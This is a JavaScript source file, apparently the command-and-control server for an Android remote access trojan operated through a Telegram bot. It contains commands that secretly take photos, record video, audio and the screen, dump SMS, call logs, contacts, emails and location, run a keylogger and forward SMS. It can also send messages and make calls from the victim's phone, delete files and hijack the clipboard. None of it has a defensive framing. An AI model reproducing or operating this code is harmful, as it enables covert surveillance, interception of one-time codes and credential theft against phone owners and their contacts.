    let response = `📱 *Connected Devices (${connectedDevices.size})*\n\n`;
    if (connectedDevices.size === 0) {
        response += 'No devices connected. Open the APK on your phone.';
    }
    for (let [socketId, deviceId] of connectedDevices) {
        const info = appData.get(deviceId) || {};
        response += `🆔 \`${deviceId}\`\n`;
        response += `   📱 ${info.platform || 'Android'}\n`;
        response += `   🔌 ${info.connectedAt ? 'Active' : 'Unknown'}\n\n`;
    }
    bot.sendMessage(chatId, response, { parse_mode: 'Markdown', ...getMainKeyboard() });
});

// /device - Full device info
bot.onText(/\/device/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getFullDeviceInfo');
});

// ========== MEDIA COMMANDS ==========
bot.onText(/\/camera/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'takePhoto');
});

bot.onText(/\/video/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'takeVideo');
});

bot.onText(/\/screenshot/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'takeScreenshot');
});

bot.onText(/\/screenrecord/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'screenRecord');
});

bot.onText(/\/mic/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'recordAudio');
});

// ========== SYSTEM COMMANDS ==========
bot.onText(/\/flash (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    const command = match[1].toLowerCase();
    if (command === 'on') {
        sendCommandToDevice(chatId, 'flashlightOn');
    } else if (command === 'off') {
        sendCommandToDevice(chatId, 'flashlightOff');
    } else {
        bot.sendMessage(chatId, 'Usage: /flash on|off', { ...getMainKeyboard() });
    }
});

bot.onText(/\/wifi (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    const command = match[1].toLowerCase();
    if (command === 'on') {
        sendCommandToDevice(chatId, 'wifiOn');
    } else if (command === 'off') {
        sendCommandToDevice(chatId, 'wifiOff');
    } else {
        bot.sendMessage(chatId, 'Usage: /wifi on|off', { ...getMainKeyboard() });
    }
});

bot.onText(/\/bt (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    const command = match[1].toLowerCase();
    if (command === 'on') {
        sendCommandToDevice(chatId, 'bluetoothOn');
    } else if (command === 'off') {
        sendCommandToDevice(chatId, 'bluetoothOff');
    } else {
        bot.sendMessage(chatId, 'Usage: /bt on|off', { ...getMainKeyboard() });
    }
});

bot.onText(/\/airplane/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'airplaneMode');
});

bot.onText(/\/dnd/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'doNotDisturb');
});

bot.onText(/\/reboot/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'reboot');
});

bot.onText(/\/lock/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'lockScreen');
});

// ========== SMS & CALL COMMANDS ==========
bot.onText(/\/sms (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    const parts = match[1].split('|');
    if (parts.length === 2) {
        sendCommandToDevice(chatId, 'sendSms', { target: parts[0].trim(), message: parts[1].trim() });
    } else {
        bot.sendMessage(chatId, 'Usage: /sms +1234567890|Your message', { ...getMainKeyboard() });
    }
});

bot.onText(/\/call (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'makeCall', { target: match[1].trim() });
});

bot.onText(/\/smslist/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getAllSms');
});

bot.onText(/\/calllogs/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getCallLogs');
});

// ========== FILE COMMANDS ==========
bot.onText(/\/files (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'listFiles', { path: match[1].trim() });
});

bot.onText(/\/delete (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'deleteFile', { path: match[1].trim() });
});

bot.onText(/\/fileinfo (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getFileInfo', { path: match[1].trim() });
});

bot.onText(/\/mkdir (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'createFolder', { path: match[1].trim() });
});

bot.onText(/\/storage/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getStorageStats');
});

// ========== APP COMMANDS ==========
bot.onText(/\/apps/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'listApps');
});

bot.onText(/\/running/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'listRunningApps');
});

bot.onText(/\/appinfo (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getAppInfo', { package: match[1].trim() });
});

bot.onText(/\/open (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'openApp', { package: match[1].trim() });
});

bot.onText(/\/kill (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'killApp', { package: match[1].trim() });
});

// ========== WHATSAPP COMMANDS ==========
bot.onText(/\/whatsapp (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    const parts = match[1].split('|');
    if (parts.length === 2) {
        sendCommandToDevice(chatId, 'sendWhatsApp', { target: parts[0].trim(), message: parts[1].trim() });
    } else {
        bot.sendMessage(chatId, 'Usage: /whatsapp +1234567890|Your message', { ...getMainKeyboard() });
    }
});

bot.onText(/\/whatsappcheck/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'checkWhatsApp');
});

bot.onText(/\/whatsappcontacts/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getWhatsAppContacts');
});

// ========== EMAIL COMMANDS ==========
bot.onText(/\/emails/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'listEmails');
});

bot.onText(/\/emailcontacts/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getEmailContacts');
});

// ========== LOCATION & CONTACTS ==========
bot.onText(/\/location/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getLocation');
});

bot.onText(/\/contacts/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getContacts');
});

// ========== CLIPBOARD COMMANDS ==========
bot.onText(/\/clipboardget/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getClipboard');
});

bot.onText(/\/clipboardset (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'setClipboard', { text: match[1].trim() });
});

// ========== NETWORK COMMANDS ==========
bot.onText(/\/wifinetworks/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getWifiNetworks');
});

bot.onText(/\/btdevices/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getBluetoothDevices');
});

bot.onText(/\/sim/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getSimInfo');
});

bot.onText(/\/network/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getNetworkInfo');
});

bot.onText(/\/battery/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getBatteryInfo');
});

// ========== KEYLOGGER COMMANDS ==========
bot.onText(/\/keylogger (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    const command = match[1].toLowerCase();
    if (command === 'start') {
        sendCommandToDevice(chatId, 'startKeylogger');
    } else if (command === 'stop') {
        sendCommandToDevice(chatId, 'stopKeylogger');
    } else {
        bot.sendMessage(chatId, 'Usage: /keylogger start|stop', { ...getMainKeyboard() });
    }
});

bot.onText(/\/keylogget/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getKeylogs');
});

// ========== SMS FORWARD COMMANDS ==========
bot.onText(/\/forward (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    const command = match[1].toLowerCase();
    if (command === 'on') {
        sendCommandToDevice(chatId, 'enableSMSForward');
    } else if (command === 'off') {
        sendCommandToDevice(chatId, 'disableSMSForward');
    } else {
        bot.sendMessage(chatId, 'Usage: /forward on|off', { ...getMainKeyboard() });
    }
});

// ========== MISC COMMANDS ==========
bot.onText(/\/vibrate (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    const duration = parseInt(match[1]) || 500;
    sendCommandToDevice(chatId, 'vibrate', { duration: duration });
});

bot.onText(/\/wallpaper (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'setWallpaper', { path: match[1].trim() });
});

bot.onText(/\/clearnotif/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'clearNotifications');
});

// ========== BUTTON HANDLERS ==========
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    if (!msg.text || msg.text.startsWith('/')) return;

    const text = msg.text;
    let command = '';
    let extras = {};
    
    // Special handling for SMS button (opens input dialog)
    if (text === '📨 SMS') {
        bot.sendMessage(chatId,
            `📨 *Send SMS*\n\nEnter in format:\n\`+1234567890|Your message\``,
            {
                parse_mode: 'Markdown',
                reply_markup: {
                    keyboard: [['🔙 Back to Main']],
                    resize_keyboard: true
                }
            }
        );
        const smsListener = (msg2) => {
            if (msg2.text === '🔙 Back to Main') {
                bot.removeListener('message', smsListener);
                bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                return;
            }
            const parts = msg2.text.split('|');
            if (parts.length === 2) {
                sendCommandToDevice(chatId, 'sendSms', { target: parts[0].trim(), message: parts[1].trim() });
            } else {
                bot.sendMessage(chatId, '❌ Invalid format. Use: +1234567890|Your message', { ...getMainKeyboard() });
            }
            bot.removeListener('message', smsListener);
        };
        bot.on('message', smsListener);
        return;
    }
    
    // Special handling for Call button
    if (text === '📞 Call') {
        bot.sendMessage(chatId,
            `📞 *Make Call*\n\nEnter phone number:\n\`+1234567890\``,
            {
                parse_mode: 'Markdown',
                reply_markup: {
                    keyboard: [['🔙 Back to Main']],
                    resize_keyboard: true
                }
            }
        );
        const callListener = (msg2) => {
            if (msg2.text === '🔙 Back to Main') {
                bot.removeListener('message', callListener);
                bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                return;
            }
            sendCommandToDevice(chatId, 'makeCall', { target: msg2.text.trim() });
            bot.removeListener('message', callListener);
        };
        bot.on('message', callListener);
        return;
    }

    // Check if button exists in mapping
    if (buttonToCommand[text]) {
        command = buttonToCommand[text];
        
        // Add extras for specific commands
        if (text === '📁 Files' || text === '📂 List Files') {
            extras = { path: '/sdcard/' };
        }
        if (text === '📳 Vibrate') {
            extras = { duration: 500 };
        }
    } else {
        // Unknown command
        bot.sendMessage(chatId, `❌ Unknown command: ${text}\nUse buttons or /help`, { ...getMainKeyboard() });
        return;
    }

    if (command) {
        sendCommandToDevice(chatId, command, extras);
    }
});

// ========== WEB STATUS ENDPOINT ==========
app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        devices: connectedDevices.size,
        deviceList: Array.from(connectedDevices.values()),
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

app.get('/devices', (req, res) => {
    const deviceList = [];
    for (let [socketId, deviceId] of connectedDevices) {
        const info = appData.get(deviceId) || {};
        deviceList.push({
            id: deviceId,
            platform: info.platform || 'unknown',
            connectedAt: info.connectedAt,
            lastHeartbeat: info.lastHeartbeat,
            smsForwarding: info.smsForwarding || false,
            info: info
        });
    }
    res.json(deviceList);
});

// ========== KEEP ALIVE ==========
setInterval(() => {
    const now = new Date().toISOString();
    console.log(`💓 Keep-alive ping at ${now}`);
}, 60000);

// ========== START SERVER ==========
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📱 Connected devices: ${connectedDevices.size}`);
    console.log(`🤖 Bot is ready!`);
    console.log(`📊 Status page: https://dog-agd9.onrender.com/status`);
});

// ========== GRACEFUL SHUTDOWN ==========
process.on('SIGINT', () => {
    console.log('🛑 Shutting down...');
    io.close(() => {
        server.close(() => {
            process.exit(0);
        });
    });
});